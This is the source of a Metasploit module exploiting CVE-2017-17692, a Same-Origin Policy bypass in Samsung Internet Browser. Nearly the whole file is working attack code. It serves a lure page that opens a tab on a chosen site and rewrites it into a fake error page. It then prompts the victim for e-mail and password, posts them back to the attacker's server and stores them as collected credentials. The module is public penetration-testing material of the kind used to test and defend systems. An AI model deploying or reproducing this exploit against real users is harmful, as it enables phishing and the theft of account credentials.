##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Samsung Internet Browser SOP Bypass',
        'Description'    => %q(
          This module takes advantage of a Same-Origin Policy (SOP) bypass vulnerability in the
          Samsung Internet Browser, a popular mobile browser shipping with Samsung Android devices.
          By default, it initiates a redirect to a child tab, and rewrites the innerHTML to gather
          credentials via a fake pop-up.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Dhiraj Mishra', # Original discovery, disclosure
          'Tod Beardsley', # Metasploit module
          'Jeffrey Martin' # Metasploit module
        ],
        'References'     => [
        [ 'CVE', '2017-17692' ],
        ['URL', 'http://fr.0day.today/exploit/description/28434']
        ],
        'DisclosureDate' => 'Nov 08 2017',
        'Actions'        => [[ 'WebServer' ]],
        'PassiveActions' => [ 'WebServer' ],
        'DefaultAction'  => 'WebServer'
      )
    )

  register_options([
      OptString.new('TARGET_URL', [
        true,
        'The URL to spoof origin from.',
        'http://example.com/'
      ]),
      OptString.new('CUSTOM_HTML', [
        true,
        'HTML to display to the victim.',
        'This page has moved. Please <a href="#">click here</a> to redirect your browser.'
      ])
    ])

  register_advanced_options([
    OptString.new('CUSTOM_JS', [
      false,
      "Custom Javascript to inject as the go() function. Use the variable 'x' to refer to the new tab.",
      ''
    ])
  ])

  end

  def run
    exploit # start http server
  end

  def evil_javascript
    return datastore['CUSTOM_JS'] unless datastore['CUSTOM_JS'].blank?
    js = <<-EOS
      setTimeout(function(){
        x.document.body.innerHTML='<h1>404 Error</h1>'+
        '<p>Oops, something went wrong.</p>';
        a=x.prompt('E-mail','');
        b=x.prompt('Password','');
        var cred=JSON.stringify({'user':a,'pass':b});
        var xmlhttp = new XMLHttpRequest;
          xmlhttp.open('POST', window.location, true);
          xmlhttp.send(cred);
        }, 3000);
    EOS
    js
  end

  def setup
    @html = <<-EOS
        <html>
        <meta charset="UTF-8">
        <head>
        <script>
        function go(){
          try {
            var x = window.open('#{datastore['TARGET_URL']}');
            #{evil_javascript}
            } catch(e) { }
          }
        </script>
        </head>
        <body onclick="go()">
        #{datastore['CUSTOM_HTML']}
        </body></html>
      EOS
  end

  def store_cred(username,password)
    credential_data = {
      origin_type: :import,
      module_fullname: self.fullname,
      filename: 'msfconsole',
      workspace_id: myworkspace_id,
      service_name: 'web_service',
      realm_value: datastore['TARGET_URL'],
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      private_type: :password,
      private_data: password,
      username: username
    }
    create_credential(credential_data)
  end

  # This assumes the default schema is being used.
  # If it's not that, it'll just display the collected POST data.
  def collect_data(request)
    cred = JSON.parse(request.body)
    u = cred['user']
    p = cred['pass']
    if u.blank? || p.blank?
      print_good("#{cli.peerhost}: POST data received from #{datastore['TARGET_URL']}: #{request.body}")
    else
      print_good("#{cli.peerhost}: Collected credential for '#{datastore['TARGET_URL']}' #{u}:#{p}")
      store_cred(u,p)
    end
  end

  def on_request_uri(cli, request)
    case request.method.downcase
    when 'get' # initial connection
      print_status("#{cli.peerhost}: Request '#{request.method} #{request.uri}'")
      print_status("#{cli.peerhost}: Attempting to spoof origin for #{datastore['TARGET_URL']}")
      send_response(cli, @html)
    when 'post' # must have fallen for it
      collect_data(request)
    else
      print_error("#{cli.peerhost}: Unhandled method: #{request.method}")
    end
  end

end
